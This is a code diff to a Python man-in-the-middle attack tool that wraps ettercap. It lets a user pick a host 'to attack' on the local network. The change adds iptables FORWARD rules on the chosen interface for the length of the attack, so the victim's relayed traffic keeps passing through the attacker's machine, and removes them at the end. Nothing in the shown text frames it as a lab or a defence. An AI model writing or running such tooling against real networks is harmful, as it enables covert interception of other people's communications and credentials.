@@ -33,6 +33,14 @@ def load_hosts(json_file: str):
 
     return hosts, data
  
+def set_rules_iface(iface):
+    subprocess.run(["iptables", "-A", "FORWARD", "-o", iface, "-j", "ACCEPT"])
+    subprocess.run(["iptables", "-A", "FORWARD", "-i", iface, "-j", "ACCEPT"])
+
+def return_rules_iface(iface):
+    subprocess.run(["iptables", "-D", "FORWARD", "-o", iface, "-j", "ACCEPT"])
+    subprocess.run(["iptables", "-D", "FORWARD", "-i", iface, "-j", "ACCEPT"])
+
 def show_menu():
     print("=" * 50)
     print("\n MITM Attack ")
@@ -102,7 +110,7 @@ def main():
         print(f"{i}. IP: {ip}, MAC: {mac}")
 
     default_iface = data.get("iface", "wlan0")
-
+    set_rules_iface(default_iface)
     while True:
         try:
             choice_raw = input("Select the host to attack (number): ")
@@ -122,6 +130,6 @@ def main():
         if opt == "4":
             break
         run_ettercap(opt, target_ip, gateway_ip, iface=default_iface)
-
+    return_rules_iface(default_iface)
 if __name__ == "__main__":
     main()
